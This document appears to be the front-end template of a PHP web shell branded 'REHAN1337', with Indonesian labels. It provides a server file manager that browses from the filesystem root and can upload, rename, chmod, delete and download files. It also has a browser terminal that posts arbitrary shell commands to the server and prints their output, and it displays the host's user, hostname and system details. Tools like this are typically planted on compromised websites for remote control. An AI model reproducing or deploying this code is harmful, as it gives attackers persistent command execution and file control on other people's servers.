    .pwd-bar{display:flex;align-items:center;gap:8px;flex-wrap:wrap;background:rgba(10,20,40,.7);border:1px solid rgba(59,130,246,.3);border-radius:12px;padding:13px 16px;margin-bottom:18px;box-shadow:0 0 20px rgba(37,99,235,.2)}
    .pwd-bar > svg{color:#60a5fa;flex-shrink:0}
    .pwd-bar .lbl{color:#93c5fd;font-size:10.5px;font-weight:700;letter-spacing:1.2px;text-transform:uppercase;margin-right:4px}
    .pwd-crumbs{display:inline-flex;align-items:center;flex-wrap:wrap;font-family:'JetBrains Mono','Courier New',monospace;font-weight:700;font-size:13px}
    .pwd-crumbs .seg{padding:4px 9px;border-radius:6px;color:#93c5fd;text-decoration:none;cursor:pointer;transition:all .2s;display:inline-flex;align-items:center;gap:4px}
    .pwd-crumbs .seg:hover{background:rgba(59,130,246,.3);color:#fff;box-shadow:0 0 12px rgba(59,130,246,.7);text-shadow:0 0 8px rgba(96,165,250,.8)}
    .pwd-crumbs .seg.root{color:#60a5fa;text-shadow:0 0 8px rgba(96,165,250,.7)}
    .pwd-crumbs .seg.root:hover{text-shadow:0 0 14px rgba(96,165,250,1)}
    .pwd-crumbs .seg.current{background:rgba(96,165,250,.25);color:#bfdbfe;border:1px solid rgba(96,165,250,.5);box-shadow:0 0 12px rgba(96,165,250,.5);cursor:default;pointer-events:none;text-shadow:0 0 10px rgba(191,219,254,.8)}
    .pwd-crumbs .sep{color:#475569;user-select:none;margin:0 1px;font-size:13px}
    .pwd-bar .tag{color:#93c5fd;font-size:10.5px;font-weight:600;margin-left:auto;opacity:.8}

    /* ===== TOOLBAR ===== */
    .toolbar{display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:10px;margin-bottom:18px}
    .tool{background:rgba(10,20,40,.6);backdrop-filter:blur(10px);border:1px solid rgba(59,130,246,.25);border-radius:11px;padding:12px 14px;transition:all .2s}
    .tool:hover{border-color:rgba(59,130,246,.5);box-shadow:0 0 16px rgba(37,99,235,.3)}
    .tool form{display:flex;gap:8px;flex-wrap:wrap;align-items:center}
    .tool .lbl-top{display:flex;align-items:center;gap:6px;color:#60a5fa;font-size:10.5px;font-weight:700;margin-bottom:8px;text-transform:uppercase;letter-spacing:.8px;width:100%}
    input[type=text],input[type=file]{flex:1;min-width:80px;background:rgba(4,8,20,.9);border:1px solid rgba(59,130,246,.3);color:#e2e8f0;padding:8px 11px;border-radius:7px;font-size:12.5px;outline:none;font-family:inherit;transition:all .2s}
    input[type=text]:focus{border-color:#60a5fa;box-shadow:0 0 0 2px rgba(59,130,246,.2)}
    input::placeholder{color:#64748b}
    input[type=file]::file-selector-button{background:linear-gradient(135deg,#1e3a8a,#2563eb);border:0;color:#fff;padding:5px 10px;border-radius:5px;cursor:pointer;font-weight:600;font-size:11.5px;margin-right:6px}
    .btn{background:linear-gradient(135deg,#1e3a8a,#2563eb);color:#fff;border:0;padding:8px 14px;border-radius:7px;cursor:pointer;font-weight:700;font-size:11.5px;display:inline-flex;align-items:center;gap:5px;letter-spacing:.4px;box-shadow:0 0 10px rgba(37,99,235,.5);transition:all .2s;font-family:inherit}
    .btn:hover{transform:translateY(-1px);box-shadow:0 0 18px rgba(37,99,235,.9)}

    /* ===== TABLE ===== */
    .table-wrap{background:rgba(10,20,40,.6);backdrop-filter:blur(10px);border:1px solid rgba(59,130,246,.25);border-radius:12px;overflow:hidden;box-shadow:0 0 22px rgba(37,99,235,.15)}
    table{width:100%;border-collapse:collapse}
    th{background:rgba(59,130,246,.12);color:#93c5fd;padding:12px 16px;text-align:left;font-size:10.5px;font-weight:700;letter-spacing:1.2px;text-transform:uppercase;border-bottom:1px solid rgba(59,130,246,.3)}
    td{padding:11px 16px;border-bottom:1px solid rgba(59,130,246,.08);font-size:12.5px}
    tbody tr{transition:background .2s;animation:rowIn .35s ease backwards}
    @keyframes rowIn{from{opacity:0;transform:translateX(-10px)}to{opacity:1;transform:translateX(0)}}
    tbody tr:hover{background:rgba(59,130,246,.07)}
    tbody tr:last-child td{border-bottom:0}
    .name-cell{display:flex;align-items:center;gap:9px}
    .name-cell svg{color:#60a5fa}
    .name-cell.folder svg{color:#93c5fd}
    .name-cell a{color:#e2e8f0;text-decoration:none;transition:.2s}
    .name-cell a:hover{color:#93c5fd;text-shadow:0 0 8px rgba(96,165,250,.6)}
    .meta{color:#64748b;font-size:11.5px}
    .perm{background:rgba(37,99,235,.15);color:#bfdbfe;padding:2px 7px;border-radius:5px;font-size:10.5px;font-family:'Courier New',monospace;font-weight:600;border:1px solid rgba(37,99,235,.3)}
    .actions{display:flex;gap:5px;justify-content:flex-end}
    .act{width:30px;height:30px;display:inline-flex;align-items:center;justify-content:center;border-radius:8px;background:rgba(59,130,246,.1);border:1px solid rgba(59,130,246,.25);color:#60a5fa;text-decoration:none;transition:all .2s;cursor:pointer}
    .act:hover{background:rgba(59,130,246,.3);border-color:#60a5fa;color:#fff;box-shadow:0 0 12px rgba(37,99,235,.7);transform:translateY(-1px)}
    .act.rename{color:#fbbf24;background:rgba(251,191,36,.1);border-color:rgba(251,191,36,.3)}
    .act.rename:hover{background:rgba(251,191,36,.25);border-color:#fbbf24;color:#fff;box-shadow:0 0 12px rgba(251,191,36,.7)}
    .act.chmod{color:#38bdf8;background:rgba(56,189,248,.1);border-color:rgba(56,189,248,.3)}
    .act.chmod:hover{background:rgba(56,189,248,.25);border-color:#38bdf8;color:#fff;box-shadow:0 0 12px rgba(56,189,248,.7)}
    .act.danger{color:#f87171;background:rgba(239,68,68,.1);border-color:rgba(239,68,68,.3)}
    .act.danger:hover{background:rgba(239,68,68,.3);border-color:#ef4444;color:#fff;box-shadow:0 0 12px rgba(239,68,68,.8);transform:translateY(-1px)}
    .act.danger.folder-del{background:rgba(220,38,38,.15);border-color:rgba(220,38,38,.4)}
    .empty{text-align:center;padding:40px;color:#64748b;font-size:13px}

    /* ===== DIVIDER SECTION (RAPI & TIPIS) ===== */
    .divider-row td{
        padding:6px 16px;
        background:transparent !important;
        border-bottom:1px solid rgba(59,130,246,.12) !important;
    }
    .divider-row .dv-inner{
        display:flex;align-items:center;gap:10px;
        color:#60a5fa;
        font-size:9.5px;
        font-weight:700;
        letter-spacing:2px;
        text-transform:uppercase;
    }
    .divider-row .dv-inner::after{
        content:'';
        flex:1;
        height:1px;
        background:linear-gradient(90deg, rgba(59,130,246,.35), transparent);
    }
    .divider-row .dv-count{
        background:rgba(59,130,246,.15);
        border:1px solid rgba(96,165,250,.3);
        color:#bfdbfe;
        padding:0 6px;
        border-radius:4px;
        font-size:9px;
        font-weight:700;
        font-family:'JetBrains Mono',monospace;
        letter-spacing:0;
        line-height:1.6;
    }
    .divider-row.files .dv-inner{
        color:#a78bfa;
    }
    .divider-row.files .dv-inner::after{
        background:linear-gradient(90deg, rgba(139,92,246,.35), transparent);
    }
    .divider-row.files .dv-count{
        background:rgba(139,92,246,.15);
        border-color:rgba(167,139,250,.3);
        color:#ddd6fe;
    }

    /* ===== TERMINAL MODAL ===== */
    .terminal-overlay{
        position:fixed;inset:0;
        background:rgba(0,0,0,.75);
        backdrop-filter:blur(6px);
        z-index:9998;
        display:none;
        align-items:center;justify-content:center;
        padding:20px;
        animation:fadeOverlay .25s ease;
    }
    .terminal-overlay.active{display:flex}
    .terminal-box{
        width:100%;max-width:900px;
        height:80vh;max-height:650px;
        background:#02060f;
        border:1px solid rgba(74,222,128,.35);
        border-radius:14px;
        overflow:hidden;
        display:flex;flex-direction:column;
        box-shadow:0 0 40px rgba(74,222,128,.25),0 20px 60px rgba(0,0,0,.7);
        animation:termIn .3s ease;
    }
    @keyframes termIn{from{opacity:0;transform:scale(.95)}to{opacity:1;transform:scale(1)}}
    .term-header{
        display:flex;align-items:center;gap:10px;
        padding:10px 14px;
        background:linear-gradient(180deg,rgba(20,30,50,.95),rgba(15,20,35,.95));
        border-bottom:1px solid rgba(74,222,128,.2);
    }
    .term-dots{display:flex;gap:6px}
    .term-dots span{width:11px;height:11px;border-radius:50%}
    .term-dots .d1{background:#ef4444;box-shadow:0 0 6px rgba(239,68,68,.6)}
    .term-dots .d2{background:#fbbf24;box-shadow:0 0 6px rgba(251,191,36,.6)}
    .term-dots .d3{background:#4ade80;box-shadow:0 0 6px rgba(74,222,128,.6)}
    .term-title{
        flex:1;color:#4ade80;
        font-family:'JetBrains Mono','Courier New',monospace;
        font-size:12px;font-weight:700;letter-spacing:1px;
        display:flex;align-items:center;gap:6px;
        text-shadow:0 0 10px rgba(74,222,128,.6);
    }
    .term-close{
        background:rgba(239,68,68,.15);
        border:1px solid rgba(239,68,68,.4);
        color:#f87171;
        width:26px;height:26px;border-radius:6px;
        cursor:pointer;display:flex;align-items:center;justify-content:center;
        transition:all .2s;font-family:inherit;
    }
    .term-close:hover{background:rgba(239,68,68,.35);color:#fff;box-shadow:0 0 10px rgba(239,68,68,.7)}
    .term-body{
        flex:1;overflow-y:auto;
        padding:14px 16px;
        font-family:'JetBrains Mono','Courier New',monospace;
        font-size:13px;line-height:1.55;
        color:#cbd5e1;
        background:#02060f;
        cursor:text;
    }
    .term-body::-webkit-scrollbar{width:8px}
    .term-body::-webkit-scrollbar-track{background:rgba(74,222,128,.03)}
    .term-body::-webkit-scrollbar-thumb{background:rgba(74,222,128,.25);border-radius:4px}
    .term-body::-webkit-scrollbar-thumb:hover{background:rgba(74,222,128,.45)}
    .term-line{white-space:pre-wrap;word-break:break-all}
    .term-line.cmd-line{color:#4ade80}
    .term-line.err-line{color:#f87171}
    .term-line.info-line{color:#60a5fa}
    .term-prompt{color:#4ade80;font-weight:700}
    .term-prompt .user{color:#fbbf24}
    .term-prompt .path{color:#60a5fa}
    .term-prompt .sym{color:#4ade80}
    .term-input-line{
        display:flex;align-items:center;gap:0;
        margin-top:4px;
    }
    .term-input-line .term-prompt{flex-shrink:0;margin-right:6px;user-select:none}
    .term-input{
        flex:1;
        background:transparent;
        border:0;outline:0;
        color:#e2e8f0;
        font-family:'JetBrains Mono','Courier New',monospace;
        font-size:13px;
        caret-color:#4ade80;
        padding:0;
    }
    .term-hint{
        padding:6px 14px;
        background:rgba(74,222,128,.05);
        border-top:1px solid rgba(74,222,128,.15);
        color:#64748b;
        font-size:10.5px;
        font-family:'JetBrains Mono',monospace;
        display:flex;justify-content:space-between;align-items:center;gap:10px;flex-wrap:wrap;
    }
    .term-hint kbd{
        background:rgba(74,222,128,.12);
        border:1px solid rgba(74,222,128,.3);
        color:#4ade80;
        padding:1px 6px;border-radius:4px;
        font-size:9.5px;font-weight:700;
    }

    @media(max-width:768px){
        body{padding:14px}
        .hide-mobile{display:none}
        .info-logo{width:60px;height:60px}
        .info-title{font-size:16px}
        .info-top-actions{margin-left:0;width:100%}
        .pwd-crumbs{font-size:11.5px}
        .pwd-crumbs .seg{padding:3px 6px}
        .info-chips .chip{font-size:10px;padding:3px 7px}
        .popup{min-width:280px;padding:26px 24px 22px}
        .popup-icon{width:60px;height:60px}
        .popup-title{font-size:17px}
        .popup-msg{font-size:12.5px}
        .terminal-box{height:90vh}
        .term-body{font-size:12px;padding:10px 12px}
    }
</style>
</head>
<body>

<?php if ($notify): ?>
<div class="popup-overlay" onclick="closePopup()"></div>
<div class="popup <?=htmlspecialchars($notify['type'])?>" id="popup">
    <div class="popup-icon">
        <?php if ($notify['type'] === 'success'): ?>
            <?=icon('check', 36)?>
        <?php else: ?>
            <?=icon('alert', 36)?>
        <?php endif; ?>
    </div>
    <div class="popup-title"><?=$notify['type'] === 'success' ? 'BERHASIL!' : 'GAGAL!'?></div>
    <div class="popup-msg"><?=htmlspecialchars($notify['msg'])?></div>
    <button class="popup-btn" onclick="closePopup()">OK</button>
</div>
<script>
    <?php if ($notify['type'] === 'success'): ?>
    setTimeout(closePopup, 3000);
    <?php endif; ?>
    function closePopup() {
        var p = document.getElementById('popup');
        var o = document.querySelector('.popup-overlay');
        if (p) { p.classList.add('hide'); }
        if (o) { o.style.opacity = '0'; }
        setTimeout(function(){ if (p) p.remove(); if (o) o.remove(); }, 300);
    }
    document.addEventListener('keydown', function(e){
        if (e.key === 'Enter' || e.key === 'Escape') closePopup();
    });
</script>
<?php endif; ?>

<!-- INFO BAR -->
<div class="info-bar">
    <div class="info-logo"><img src="<?=htmlspecialchars($LOGO)?>" alt="Logo"></div>
    <div class="info-content">
        <div class="info-title-row">
            <span class="info-title"><?=htmlspecialchars($APP_NAME)?></span>
            <span class="live-badge">LIVE</span>
            <div class="info-top-actions">
                <button type="button" class="terminal-btn" onclick="openTerminal()"><?=icon('terminal',12)?> Terminal</button>
                <a href="?p=<?=urlencode($START)?>"><?=icon('home',12)?> Home</a>
                <a href="?logout=1" class="logout"><?=icon('logout',12)?> Logout</a>
            </div>
        </div>
        <div class="info-chips">
            <span class="chip"><?=icon('lock',11)?> <b><?=htmlspecialchars($user)?></b>@<?=htmlspecialchars($hostname)?></span>
            <span class="chip"><?=htmlspecialchars($uname)?></span>
            <span class="chip">PHP <b><?=PHP_VERSION?></b></span>
            <span class="chip pct"><?=icon('folder',11)?> <?=htmlspecialchars($hddTxt)?> (<?=$hddPct?>%)</span>
        </div>
    </div>
</div>

<!-- PWD BAR -->
<div class="pwd-bar">
    <?=icon('folder',15)?>
    <span class="lbl">PWD</span>
    <span class="pwd-crumbs">
        <?php foreach ($absParts as $i => $ap):
            $isLast = ($i === $absLast);
            $absTarget = $ap['abs'];
        ?>
            <?php if ($i === 0): ?>
                <a href="?p=<?=urlencode('/')?>" class="seg root <?=$isLast?'current':''?>" title="Filesystem root"><?=icon('home',11)?> /</a>
            <?php else: ?>
                <span class="sep">/</span>
                <?php if ($isLast): ?>
                    <span class="seg current" title="<?=htmlspecialchars($ap['abs'])?>"><?=htmlspecialchars($ap['label'])?></span>
                <?php else: ?>
                    <a href="?p=<?=urlencode($absTarget)?>" class="seg" title="<?=htmlspecialchars($ap['abs'])?>"><?=htmlspecialchars($ap['label'])?></a>
                <?php endif; ?>
            <?php endif; ?>
        <?php endforeach; ?>
    </span>
    <span class="tag">[ <?=htmlspecialchars($APP_NAME)?> ]</span>
</div>

<!-- TOOLBAR -->
<div class="toolbar">
    <div class="tool">
        <div class="lbl-top"><?=icon('upload',11)?> Upload File</div>
        <form method="post" enctype="multipart/form-data">
            <input type="file" name="file" required>
            <button type="submit" class="btn"><?=icon('upload',11)?> Upload</button>
        </form>
    </div>
    <div class="tool">
        <div class="lbl-top"><?=icon('file',11)?> Buat File</div>
        <form method="post">
            <input type="text" name="newfile" placeholder="nama.txt" required>
            <button type="submit" class="btn"><?=icon('plus',11)?> Buat</button>
        </form>
    </div>
    <div class="tool">
        <div class="lbl-top"><?=icon('folder',11)?> Buat Folder</div>
        <form method="post">
            <input type="text" name="newfolder" placeholder="nama-folder" required>
            <button type="submit" class="btn"><?=icon('plus',11)?> Buat</button>
        </form>
    </div>
</div>

<!-- TABLE -->
<div class="table-wrap">
<table>
    <thead>
        <tr>
            <th>Nama</th>
            <th class="hide-mobile">Size</th>
            <th class="hide-mobile">Perms</th>
            <th class="hide-mobile">Modified</th>
            <th style="text-align:right">Actions</th>
        </tr>
    </thead>
    <tbody>
        <?php 
        // === FOLDER SECTION ===
        if (count($folders) > 0):
        ?>
        <tr class="divider-row folders">
            <td colspan="5">
                <div class="dv-inner">
                    <?=icon('folder',11)?> FOLDERS
                    <span class="dv-count"><?=count($folders)?></span>
                </div>
            </td>
        </tr>
        <?php
        $i = 0;
        foreach ($folders as $it):
            $i++;
            $full = $path.'/'.$it;
            $perms = substr(sprintf('%o', @fileperms($full)), -4);
            $mtime = date('Y-m-d H:i', @filemtime($full));
            $absTarget = rtrim($path, '/') . '/' . $it;
            $link = '?p='.urlencode($absTarget);
        ?>
        <tr style="animation-delay:<?=min($i*0.02,0.4)?>s">
            <td>
                <div class="name-cell folder">
                    <?=icon('folder',15)?>
                    <a href="<?=$link?>"><?=htmlspecialchars($it)?></a>
                </div>
            </td>
            <td class="meta hide-mobile">—</td>
            <td class="hide-mobile"><span class="perm"><?=$perms?></span></td>
            <td class="meta hide-mobile"><?=$mtime?></td>
            <td>
                <div class="actions">
                    <a href="#" onclick="renameItem('<?=htmlspecialchars(addslashes($it))?>');return false;" class="act rename" title="Rename"><?=icon('edit-pencil',13)?></a>
                    <a href="#" onclick="chmodItem('<?=htmlspecialchars(addslashes($it))?>','<?=$perms?>');return false;" class="act chmod" title="Chmod"><?=icon('chmod',13)?></a>
                    <a href="?p=<?=urlencode($path)?>&del=<?=urlencode($it)?>" 
                       class="act danger folder-del" 
                       title="Hapus folder + semua isi" 
                       onclick="return confirmDelete('<?=htmlspecialchars(addslashes($it))?>', true);">
                        <?=icon('trash',13)?>
                    </a>
                </div>
            </td>
        </tr>
        <?php endforeach; 
        endif;
        
        // === FILE SECTION ===
        if (count($files) > 0):
        ?>
        <tr class="divider-row files">
            <td colspan="5">
                <div class="dv-inner">
                    <?=icon('file',11)?> FILES
                    <span class="dv-count"><?=count($files)?></span>
                </div>
            </td>
        </tr>
        <?php
        $i = 0;
        foreach ($files as $it):
            $i++;
            $full = $path.'/'.$it;
            $size = round(@filesize($full)/1024, 2).' KB';
            $perms = substr(sprintf('%o', @fileperms($full)), -4);
            $mtime = date('Y-m-d H:i', @filemtime($full));
            $link = '?p='.urlencode($path).'&edit='.urlencode($it);
        ?>
        <tr style="animation-delay:<?=min($i*0.02,0.4)?>s">
            <td>
                <div class="name-cell file">
                    <?=icon('file',15)?>
                    <a href="<?=$link?>"><?=htmlspecialchars($it)?></a>
                </div>
            </td>
            <td class="meta hide-mobile"><?=$size?></td>
            <td class="hide-mobile"><span class="perm"><?=$perms?></span></td>
            <td class="meta hide-mobile"><?=$mtime?></td>
            <td>
                <div class="actions">
                    <a href="?p=<?=urlencode($path)?>&dl=<?=urlencode($it)?>" class="act" title="Download"><?=icon('download',13)?></a>
                    <a href="#" onclick="renameItem('<?=htmlspecialchars(addslashes($it))?>');return false;" class="act rename" title="Rename"><?=icon('edit-pencil',13)?></a>
                    <a href="#" onclick="chmodItem('<?=htmlspecialchars(addslashes($it))?>','<?=$perms?>');return false;" class="act chmod" title="Chmod"><?=icon('chmod',13)?></a>
                    <a href="?p=<?=urlencode($path)?>&del=<?=urlencode($it)?>" 
                       class="act danger" 
                       title="Hapus file" 
                       onclick="return confirmDelete('<?=htmlspecialchars(addslashes($it))?>', false);">
                        <?=icon('trash',13)?>
                    </a>
                </div>
            </td>
        </tr>
        <?php endforeach; 
        endif;
        
        // === EMPTY STATE ===
        if (count($folders) === 0 && count($files) === 0): 
        ?>
        <tr><td colspan="5"><div class="empty">Folder kosong</div></td></tr>
        <?php endif; ?>
    </tbody>
</table>
</div>

<!-- ===== TERMINAL MODAL ===== -->
<div class="terminal-overlay" id="terminalOverlay" onclick="if(event.target===this) closeTerminal()">
    <div class="terminal-box">
        <div class="term-header">
            <div class="term-dots">
                <span class="d1"></span><span class="d2"></span><span class="d3"></span>
            </div>
            <div class="term-title"><?=icon('terminal',13)?> REHAN1337 @ <?=htmlspecialchars($hostname)?></div>
            <button class="term-close" onclick="closeTerminal()" title="Close"><?=icon('x',13)?></button>
        </div>
        <div class="term-body" id="termBody" onclick="focusTermInput()">
            <div class="term-line info-line">
                Welcome to <b style="color:#4ade80">REHAN1337 Terminal</b> v1.0
            </div>
            <div class="term-line info-line">Type <b style="color:#4ade80">help</b> to see available commands.</div>
            <div class="term-line info-line">────────────────────────────────────────</div>
            <div id="termOutput"></div>
            <div class="term-input-line">
                <span class="term-prompt" id="termPrompt">
                    <span class="user"><?=htmlspecialchars($user)?></span>@<span class="user"><?=htmlspecialchars($hostname)?></span>:<span class="path" id="termCwd"><?=htmlspecialchars($path)?></span><span class="sym">$</span>
                </span>
                <input type="text" class="term-input" id="termInput" autocomplete="off" spellcheck="false" placeholder="">
            </div>
        </div>
        <div class="term-hint">
            <span><kbd>↑</kbd> <kbd>↓</kbd> history · <kbd>Enter</kbd> execute · <kbd>Ctrl+L</kbd> clear</span>
            <span id="termStatus">Ready</span>
        </div>
    </div>
</div>

<form method="post" id="renameForm" style="display:none">
    <input type="hidden" name="rename_from" id="rf">
    <input type="hidden" name="rename_to" id="rt">
</form>
<form method="post" id="chmodForm" style="display:none">
    <input type="hidden" name="chmod_file" id="cf">
    <input type="hidden" name="chmod_mode" id="cm">
</form>

<script>
// ============ FILE ACTIONS ============
function renameItem(name) {
    var n = prompt("Rename:", name);
    if (n && n !== name) {
        document.getElementById('rf').value = name;
        document.getElementById('rt').value = n;
        document.getElementById('renameForm').submit();
    }
}
function chmodItem(name, cur) {
    var m = prompt("Chmod (octal):", cur);
    if (m) {
        document.getElementById('cf').value = name;
        document.getElementById('cm').value = m;
        document.getElementById('chmodForm').submit();
    }
}
function confirmDelete(name, isDir) {
    if (isDir) {
        return confirm("HAPUS FOLDER?\n\n'" + name + "'\n\nSemua isi di dalamnya juga akan terhapus permanen!\n\nLanjutkan?");
    }
    return confirm("Hapus file '" + name + "'?");
}

// ============ TERMINAL ============
const termOverlay = document.getElementById('terminalOverlay');
const termBody    = document.getElementById('termBody');
const termInput   = document.getElementById('termInput');
const termOutput  = document.getElementById('termOutput');
const termCwd     = document.getElementById('termCwd');
const termStatus  = document.getElementById('termStatus');

let termCwdValue = <?=json_encode($path)?>;
let termHistory  = [];
let termHistIdx  = -1;
let termBusy     = false;

function openTerminal() {
    termOverlay.classList.add('active');
    setTimeout(() => { termInput.focus(); }, 100);
    // Refresh prompt path
    termCwd.textContent = termCwdValue;
    termStatus.textContent = 'Ready';
}
function closeTerminal() {
    termOverlay.classList.remove('active');
}
function focusTermInput() {
    // Jangan fokus kalau user sedang select text
    if (!window.getSelection().toString()) {
        termInput.focus();
    }
}
function termScrollBottom() {
    termBody.scrollTop = termBody.scrollHeight;
}
function termEscape(s) {
    return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
}
function termAppend(text, cls) {
    if (text === '__CLEAR__') { termClear(); return; }
    const div = document.createElement('div');
    div.className = 'term-line ' + (cls || '');
    div.textContent = text;
    termOutput.appendChild(div);
    termScrollBottom();
}
function termAppendCmd(cmd) {
    const div = document.createElement('div');
    div.className = 'term-line cmd-line';
    div.innerHTML = '<span class="term-prompt">'
        + '<span class="user"><?=htmlspecialchars($user)?></span>@'
        + '<span class="user"><?=htmlspecialchars($hostname)?></span>:'
        + '<span class="path">' + termEscape(termCwdValue) + '</span>'
        + '<span class="sym">$</span></span> ' + termEscape(cmd);
    termOutput.appendChild(div);
    termScrollBottom();
}
function termClear() {
    termOutput.innerHTML = '';
    termStatus.textContent = 'Cleared';
}

async function termRun(cmd) {
    if (termBusy) return;
    cmd = cmd.trim();
    if (cmd === '') return;

    termHistory.push(cmd);
    termHistIdx = termHistory.length;

    termAppendCmd(cmd);
    termBusy = true;
    termStatus.textContent = 'Running...';

    try {
        const fd = new FormData();
        fd.append('terminal_cmd', cmd);
        fd.append('cwd', termCwdValue);
        fd.append('prev_cwd', window.__prevCwd || termCwdValue);

        const res = await fetch('', { method: 'POST', body: fd });
        const data = await res.json();

        if (data.cwd && data.cwd !== termCwdValue) {
            window.__prevCwd = termCwdValue;
            termCwdValue = data.cwd;
        }
        termCwd.textContent = termCwdValue;

        if (data.output) {
            // Deteksi error sederhana
            const isErr = /error|not found|denied|cannot|no such|invalid|missing|gagal/i.test(data.output)
                       && !/^\s*$/.test(data.output);
            termAppend(data.output, isErr ? 'err-line' : '');
        }
        termStatus.textContent = 'Ready';
    } catch (e) {
        termAppend('Error: ' + e.message, 'err-line');
        termStatus.textContent = 'Error';
    } finally {
        termBusy = false;
        termInput.focus();
        termScrollBottom();
    }
}

termInput.addEventListener('keydown', function(e) {
    if (e.key === 'Enter') {
        e.preventDefault();
        const cmd = termInput.value;
        termInput.value = '';
        termRun(cmd);
    } else if (e.key === 'ArrowUp') {
        e.preventDefault();
        if (termHistory.length === 0) return;
        if (termHistIdx > 0) termHistIdx--;
        termInput.value = termHistory[termHistIdx] || '';
        setTimeout(() => termInput.setSelectionRange(termInput.value.length, termInput.value.length), 0);
    } else if (e.key === 'ArrowDown') {
        e.preventDefault();
        if (termHistory.length === 0) return;
        if (termHistIdx < termHistory.length - 1) {
            termHistIdx++;
            termInput.value = termHistory[termHistIdx] || '';
        } else {
            termHistIdx = termHistory.length;
            termInput.value = '';
        }
    } else if (e.ctrlKey && (e.key === 'l' || e.key === 'L')) {
        e.preventDefault();
        termClear();
    } else if (e.key === 'Escape') {
        closeTerminal();
    }
});

// Auto-focus kalau klik di body terminal
termBody.addEventListener('click', function(e) {
    if (e.target === termBody) termInput.focus();
});
</script>
</body></html>
